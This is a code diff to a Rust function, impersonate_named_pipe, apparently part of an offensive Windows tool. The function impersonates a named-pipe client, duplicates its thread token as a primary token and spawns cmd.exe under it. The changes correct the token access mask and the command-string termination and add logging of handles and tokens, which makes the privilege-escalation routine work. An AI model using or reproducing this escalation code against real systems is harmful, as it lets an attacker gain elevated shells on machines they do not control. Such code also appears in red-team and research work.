@@ -299,6 +299,7 @@ pub fn impersonate_named_pipe(name: &str) -> Result<(), Error> {
     // Retrieves a pseudo handle for the calling thread.
     // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentthread
     let thread_handle = unsafe { GetCurrentThread() };
+    log::info!("Thread Handle: {}", thread_handle);
 
     let mut thread_token = 0;
     // The OpenThreadToken function opens the access token associated with a thread.
@@ -312,6 +313,7 @@ pub fn impersonate_named_pipe(name: &str) -> Result<(), Error> {
         return Err(Error::FailedToOpenThreadToken(get_last_error()));
     }
 
+    log::info!("Thread Token: {}", thread_token);
     log::info!("getting current thread and opening thread token successful!");
 
     log::info!("duplicating token");
@@ -323,7 +325,7 @@ pub fn impersonate_named_pipe(name: &str) -> Result<(), Error> {
     let duplicate_token_result = unsafe {
         DuplicateTokenEx(
             thread_token,
-            TOKEN_ALL_ACCESS,
+            MAXIMUM_ALLOWED, // bug if you use TOKEN_ALL_ACCESS (983295). MUST USE MAXIMUM_ALLOWED (33554432)
             std::ptr::null_mut(),
             SecurityImpersonation,
             TokenPrimary,
@@ -346,7 +348,7 @@ pub fn impersonate_named_pipe(name: &str) -> Result<(), Error> {
     startup_info.cb = size_of::<STARTUPINFOW>() as u32;
     let mut process_info: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };
 
-    let command = r"C:\Windows\System32\cmd.exe"
+    let command = "C:\\Windows\\System32\\cmd.exe\0"
         .encode_utf16()
         .collect::<Vec<u16>>();
 
@@ -359,7 +361,7 @@ pub fn impersonate_named_pipe(name: &str) -> Result<(), Error> {
             CREATE_NEW_CONSOLE,
             std::ptr::null_mut(),
             std::ptr::null_mut(),
-            &mut startup_info,
+            &startup_info,
             &mut process_info,
         )
     };
